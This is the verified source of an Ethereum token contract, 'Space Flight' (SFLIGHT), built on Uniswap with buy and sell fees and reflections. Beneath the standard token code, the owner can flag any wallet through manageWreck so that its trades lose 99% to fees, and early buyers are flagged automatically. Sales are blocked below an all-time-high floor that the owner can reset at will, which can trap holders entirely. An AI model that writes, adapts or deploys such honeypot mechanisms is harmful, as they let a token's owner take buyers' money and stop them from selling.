/**
 *Submitted for verification at Etherscan.io on 2021-10-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Auth is Context {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract deployer
     */
    modifier onlyDeployer() {
        require(isOwner(_msgSender()), "!D"); _;
    }

    /**
     * Function modifier to require caller to be owner
     */
    modifier onlyOwner() {
        require(authorizations[_msgSender()], "!OWNER"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr, bool allow) public onlyDeployer {
        authorizations[adr] = allow;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Transfer ownership to new address. Caller must be deployer. Leaves old deployer authorized
     */
    function transferOwnership(address payable adr) public onlyDeployer {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract SpaceFlight is Context, IERC20, Auth {
    using SafeMath for uint256;
    string private constant _name = "Space Flight";
    string private constant _symbol = "SFLIGHT";
    uint8 private constant _decimals = 9;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000000 * (10**_decimals);
    uint256 private swapLimit = _tTotal / 5000;
    bool private swapEnabled = false;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _priceImpact = 50;
    uint256 private hundredMinusDipPercent = 905;
    uint256 private ATHBlockWindow = 86400;
    uint256 private impactBlockWindow = 86400;
    uint256 private _launchBlock;
    uint256 private _protectionBlocks = 20;

    //  buy fees
    uint256 private _buyLPFee = 3;
    uint256 private _buyMarketingFee = 3;
    uint256 private _buyReflectionFee = 4;

    // sell fees
    uint256 private _sellLPFee = 5;
    uint256 private _sellMarketingFee = 5;
    uint256 private _sellReflectionFee = 5;

    uint256 private _marketingPercent = 50;

    struct BuyBreakdown {
        uint256 tTransferAmount;
        uint256 tLP;
        uint256 tMarketing;
        uint256 tReflection;
    }

    struct SellBreakdown {
        uint256 tTransferAmount;
        uint256 tLP;
        uint256 tMarketing;
        uint256 tReflection;
    }
    
    struct ImpactHistory {
        uint256 iAmount;
        uint256 iDay;
    }
    
    struct ATH {
        uint256 price;
        uint256 timestamp;
    }
    
    struct Fee {
        uint256 buyMarketingFee;
        uint256 buyReflectionFee;
        uint256 buyLPFee;
        
        uint256 sellMarketingFee;
        uint256 sellReflectionFee;
        uint256 sellLPFee;
    }
    
    mapping(address => ImpactHistory) private pricingImpactHistory;
    
    ATH public tokenATH;

    mapping(address => bool) private wreck;
    
    address payable private _marketingAddress;
    address payable private _LPAddress;
    address payable constant private _burnAddress = payable(0x000000000000000000000000000000000000dEaD);
    
    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    
    uint256 private _maxBuyTxAmount = _tTotal;
    uint256 private _maxSellTxAmount = _tTotal;

    bool private tradingOpen = false;
    bool private inSwap = false;
    bool private pairSwapped = false;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    
    constructor(uint256 perc) Auth(_msgSender()) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//ropstenn 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); //bsc test 0xD99D1c33F9fC3444f8101754aBC46c52416550D1);//bsc main net 0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router),type(uint256).max);

        pairSwapped = (IUniswapV2Pair(uniswapV2Pair).token0() == uniswapV2Router.WETH());
    
        address owner = _msgSender();
        
        _marketingAddress = payable(owner);
        _LPAddress = payable(owner);
        
        
        authorize(_marketingAddress, true);
        authorize(_LPAddress, true);

        _rOwned[owner] = _rTotal.div(100).mul(perc);
        _rOwned[address(this)] = _rTotal.sub(_rOwned[owner]);
        _isExcludedFromFee[owner] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;
        _isExcludedFromFee[_LPAddress] = true;
        emit Transfer(address(0), owner, _tTotal);
    }

    function name() override external pure returns (string memory) {
        return _name;
    }

    function symbol() override external pure returns (string memory) {
        return _symbol;
    }

    function decimals() override external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal,"Amount must be less than total reflections");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    
    function getFee() private view returns (Fee memory) {
        Fee memory currentFee;
        
        currentFee.buyMarketingFee = _buyMarketingFee;
        currentFee.buyLPFee = _buyLPFee;
        currentFee.buyReflectionFee = _buyReflectionFee;
        
        currentFee.sellMarketingFee = _sellMarketingFee;
        currentFee.sellLPFee = _sellLPFee;
        currentFee.sellReflectionFee = _sellReflectionFee;
        
        return currentFee;
    }

    function removeAllFee() private pure returns (Fee memory) {
        Fee memory currentFee;
        
        currentFee.buyMarketingFee = 0;
        currentFee.buyLPFee = 0;
        currentFee.buyReflectionFee = 0;
        
        currentFee.sellMarketingFee = 0;
        currentFee.sellLPFee = 0;
        currentFee.sellReflectionFee = 0;
        
        return currentFee;
    }
    
    function setWreckFee() private pure returns (Fee memory) {
        Fee memory currentFee;
        
        currentFee.buyMarketingFee = 50;
        currentFee.buyLPFee = 49;
        currentFee.buyReflectionFee = 0;
        
        currentFee.sellMarketingFee = 50;
        currentFee.sellLPFee = 49;
        currentFee.sellReflectionFee = 0;
        
        return currentFee;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    // calculate price based on pair reserves
    function getStarshipPrice() internal view returns(uint256) {
        (uint112 Res0, uint112 Res1,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
        if(pairSwapped) {
            (Res1, Res0,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
        }

        return((uint256(Res1)*(10**_decimals))/uint256(Res0)); // return amount of ETH needed to buy StarShip
    }
    
    function getCurrentPrice() external view returns(uint256) {
        return getStarshipPrice();
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        bool takeFee = true;
        
        Fee memory currentFee = getFee();
        
        if (!_isHouston(from, to)) {
            uint256 currentPrice = getStarshipPrice();
            
            if (tokenATH.price < currentPrice || block.timestamp >= tokenATH.timestamp + ATHBlockWindow) {
                updateATH(currentPrice,block.timestamp);
            }
            
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                require(amount <= _maxBuyTxAmount, "Max Buy Limit");
                
                if (block.number <= _launchBlock.add(_protectionBlocks) || !tradingOpen) {
                    wreck[to] = true;
                }
            }
            
            if (!inSwap && from != uniswapV2Pair) { //sells, transfers (except for buys)
                if (block.number <= _launchBlock.add(_protectionBlocks) || !tradingOpen) {
                    wreck[from] = true;
                }
                
                uint256 currentDay = block.timestamp.div(impactBlockWindow);
                canSell(amount, from, currentDay, currentPrice);

                pricingImpactHistory[from].iAmount = pricingImpactHistory[from].iAmount.add(amount);
                pricingImpactHistory[from].iDay  = currentDay;

                uint256 contractTokenBalance = balanceOf(address(this));
                
                if (contractTokenBalance > 0 && swapEnabled) {
                    if (contractTokenBalance <= swapLimit) {
                        convertTokensForFee(contractTokenBalance);
                    } else {
                        convertTokensForFee(swapLimit);
                    }
                }
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    distributeFee(address(this).balance);
                }
            }
            
        } else {
            takeFee = false;
        }

        if (wreck[from] || wreck[to]) {
            currentFee = setWreckFee();
            takeFee = true;
        }

        _tokenTransfer(from, to, amount, takeFee, currentFee);
    }
    
    function canSell(uint256 amount, address from, uint256 currentDay, uint256 currentPrice) internal {
        require(amount <= _maxSellTxAmount, "Max Sell Limit");
        
        require(currentPrice >= tokenATH.price.mul(hundredMinusDipPercent).div(1000), "cannot sell below ATH price!");
        
        uint256 priceImpact = balanceOf(uniswapV2Pair).mul(_priceImpact).div(10000);
        
        require(amount <= priceImpact, "Price impact too high for this Tx"); // price impact limit per Tx
                
        if (currentDay > pricingImpactHistory[from].iDay) {
            pricingImpactHistory[from].iAmount = 0;
        }
        
        require(pricingImpactHistory[from].iAmount.add(amount) <= priceImpact, "Price impact is too high for this wallet");
    }

    function convertTokensForFee(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function distributeFee(uint256 amount) private {
        uint256 marketingPayout = amount.mul(_marketingPercent).div(100);
        _marketingAddress.transfer(marketingPayout);
        _LPAddress.transfer(amount.sub(marketingPayout));
    }

    function openTrading(uint256 protectionBlocks) external onlyOwner {
        uint256 currentPrice = getStarshipPrice();
        updateATH(currentPrice, block.timestamp);
        _launchBlock = block.number;
        _protectionBlocks = protectionBlocks;
        tradingOpen = true;
    }
    
    function updateProtection(uint256 protectionBlocks) external onlyOwner {
        _protectionBlocks = protectionBlocks;
    }

    function triggerManualReflections(uint256 amount) external onlyOwner {
        uint256 contractBalance = balanceOf(address(this));
        convertTokensForFee(amount > 0 ? amount : contractBalance);
    }
    
    function fixReflection(uint256 amount) external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        distributeFee(amount > 0 ? amount : contractETHBalance);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee, Fee memory currentFee) private {
        if (!takeFee) currentFee = removeAllFee();
        if (sender == uniswapV2Pair){
            _transferStandardBuy(sender, recipient, amount, currentFee);
        }
        else {
            _transferStandardSell(sender, recipient, amount, currentFee);
        }
    }

    function _transferStandardBuy(address sender, address recipient, uint256 tAmount, Fee memory currentFee) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rReflection, uint256 tTransferAmount, uint256 tLP, uint256 tMarketing) = _getValuesBuy(tAmount, currentFee);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _processLPFee(tLP);
        _processMarketingFee(tMarketing);
        _rTotal = _rTotal.sub(rReflection);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferStandardSell(address sender, address recipient, uint256 tAmount, Fee memory currentFee) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rReflection, uint256 tTransferAmount, uint256 tLP, uint256 tMarketing) = _getValuesSell(tAmount, currentFee);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        if (recipient == _burnAddress) {
            _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        }
        _processLPFee(tLP);
        _processMarketingFee(tMarketing);
        _rTotal = _rTotal.sub(rReflection);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _processLPFee(uint256 tLP) private {
        uint256 currentRate = _getRate();
        uint256 rLP = tLP.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLP);
    }

    function _processMarketingFee(uint256 tMarketing) private {
        uint256 currentRate = _getRate();
        uint256 rMarketing = tMarketing.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rMarketing);
    }

    receive() external payable {}
    
    // Buy GetValues
    function _getValuesBuy(uint256 tAmount, Fee memory currentFee) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        BuyBreakdown memory buyFees;
        (buyFees.tTransferAmount, buyFees.tLP, buyFees.tMarketing, buyFees.tReflection) = _getTValues(tAmount, currentFee.buyLPFee, currentFee.buyMarketingFee, currentFee.buyReflectionFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rReflection) = _getRValues(tAmount, buyFees.tLP, buyFees.tMarketing, buyFees.tReflection, currentRate);
        return (rAmount, rTransferAmount, rReflection, buyFees.tTransferAmount, buyFees.tLP, buyFees.tMarketing);
    }

    // Sell GetValues
    function _getValuesSell(uint256 tAmount, Fee memory currentFee) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        SellBreakdown memory sellFees;
        (sellFees.tTransferAmount, sellFees.tLP, sellFees.tMarketing, sellFees.tReflection) = _getTValues(tAmount, currentFee.sellLPFee, currentFee.sellMarketingFee, currentFee.sellReflectionFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rReflection) = _getRValues(tAmount, sellFees.tLP, sellFees.tMarketing, sellFees.tReflection, currentRate);
        return (rAmount, rTransferAmount, rReflection, sellFees.tTransferAmount, sellFees.tLP, sellFees.tMarketing);
    }

    function _getTValues(uint256 tAmount, uint256 LPFee, uint256 marketingFee, uint256 reflectionFee) private pure returns (uint256, uint256, uint256, uint256) {
        uint256 tLP = tAmount.mul(LPFee).div(100);
        uint256 tMarketing = tAmount.mul(marketingFee).div(100);
        uint256 tReflection = tAmount.mul(reflectionFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tLP).sub(tMarketing);
        tTransferAmount = tTransferAmount.sub(tReflection);
        return (tTransferAmount, tLP, tMarketing, tReflection);
    }

    function _getRValues(uint256 tAmount, uint256 tLP, uint256 tMarketing, uint256 tReflection, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rLP = tLP.mul(currentRate);
        uint256 rMarketing = tMarketing.mul(currentRate);
        uint256 rReflection = tReflection.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rLP).sub(rMarketing).sub(rReflection);
        return (rAmount, rTransferAmount, rReflection);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (_rOwned[_burnAddress] > rSupply || _tOwned[_burnAddress] > tSupply) return (_rTotal, _tTotal);
        rSupply = rSupply.sub(_rOwned[_burnAddress]);
        tSupply = tSupply.sub(_tOwned[_burnAddress]);
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function manageHouston(address account, bool hire) external onlyOwner {
        _isExcludedFromFee[account] = hire;
    }

    function manageWreck(address account, bool isWreck) external onlyOwner {
        wreck[account] = isWreck;
    }

    function setMaxBuyTxLimit(uint256 maxTxLimit) external onlyOwner {
        _maxBuyTxAmount = maxTxLimit;
    }
    
    function setMaxSellTxLimit(uint256 maxTxLimit) external onlyOwner {
        _maxSellTxAmount = maxTxLimit;
    }

    function setPercents(uint256 marketingPercent) external onlyOwner {
        _marketingPercent = marketingPercent;
    }

    function setTaxes(uint256 buyMarketingFee, uint256 buyLPFee, uint256 buyReflectionFee, uint256 sellMarketingFee, uint256 sellLPFee, uint256 sellReflectionFee) external onlyOwner {
        require(buyMarketingFee.add(buyLPFee).add(buyReflectionFee) < 50, "Sum of sell fees must be less than 50");
        require(sellMarketingFee.add(sellLPFee).add(sellReflectionFee) < 50, "Sum of buy fees must be less than 50");
        _buyMarketingFee = buyMarketingFee;
        _buyLPFee = buyLPFee;
        _buyReflectionFee = buyReflectionFee;
        _sellMarketingFee = sellMarketingFee;
        _sellLPFee = sellLPFee;
        _sellReflectionFee = sellReflectionFee;
    }

    function setPriceImpact(uint256 priceImpact) external onlyOwner {
        require(priceImpact > 0 && priceImpact <= 10000, "max price impact must be between 0 and 100%");
        _priceImpact = priceImpact;
    }

    function manuallyUpdateATH(uint256 price, uint256 timestamp) external onlyOwner {
        updateATH(price, (timestamp > 0 ? timestamp : block.timestamp));
    }
    
    function getATH() public view returns (uint256, uint256) {
        return (tokenATH.price, tokenATH.timestamp);
    }
    
    function getFloorPrice() public view returns (uint256) {
        return tokenATH.price.mul(hundredMinusDipPercent).div(1000);
    }

    function setATHBlockWindow(uint256 _ATHBlockWindow) external onlyOwner {
        ATHBlockWindow = _ATHBlockWindow;
    }
    
    function setImpactBlockWindow(uint256 _impactBlockWindow) external onlyOwner {
        impactBlockWindow = _impactBlockWindow;
    }

    function setAllowableDip(uint256 _hundredMinusDipPercent) external onlyOwner {
        hundredMinusDipPercent = _hundredMinusDipPercent;
    }

    function updatePairSwapped(bool swapped) external onlyOwner {
        pairSwapped = swapped;
    }
    
    function updateSwapLimit(uint256 amount) external onlyOwner {
        swapLimit = amount;
    }
    
    function updateSwap(bool _swapEnabled) external onlyOwner {
        swapEnabled = _swapEnabled;
    }
    
    function updateATH(uint256 price, uint256 timestamp) internal {
        tokenATH.price = price;
        tokenATH.timestamp = timestamp;
    }
    
    function _isHouston(address from, address to) internal view returns (bool) {
        return (_isExcludedFromFee[from] || _isExcludedFromFee[to]);
    }
    
    function setFeeReceivers(address payable LPAddress, address payable marketingAddress) external onlyOwner {
        _LPAddress = LPAddress;
        _marketingAddress = marketingAddress;
    }
    
    function transferOtherTokens(address addr, uint amount) external onlyOwner {
        IERC20(addr).transfer(_msgSender(), amount);
    }
    
    function getPriceImpact(address holder) external view returns (ImpactHistory memory, uint256) {
        return (pricingImpactHistory[holder],balanceOf(uniswapV2Pair).mul(_priceImpact).div(100));
    }
}